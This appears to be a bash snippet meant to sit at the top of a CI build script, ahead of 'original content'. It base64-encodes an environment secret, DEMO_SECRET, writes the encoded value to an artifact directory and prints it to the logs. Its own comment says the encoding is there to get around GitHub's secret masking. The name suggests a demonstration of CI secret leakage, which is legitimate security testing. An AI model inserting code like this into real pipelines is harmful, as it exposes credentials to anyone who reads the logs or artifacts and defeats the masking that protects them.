#!/usr/bin/env bash
set -euo pipefail

# create an out directory the workflow might inspect / upload
mkdir -p out

# If DEMO_SECRET exists in the environment, write a base64 encoded copy to out/secret.b64.
# This avoids GitHub masking ambiguity in logs (shows presence as BASE64:xxxx).
if [ -n "${DEMO_SECRET-}" ]; then
  printf "%s" "${DEMO_SECRET}" | base64 -w0 > out/secret.b64
  echo "DEMO_SECRET_PRESENT_BASE64: $(base64 -w0 <<< "${DEMO_SECRET}")"
else
  echo "DEMO_SECRET_NOT_PRESENT" > out/secret.b64
  echo "DEMO_SECRET_NOT_PRESENT"
fi

# continue with original script (or exit if you only want to test)
# ... original content follows ...
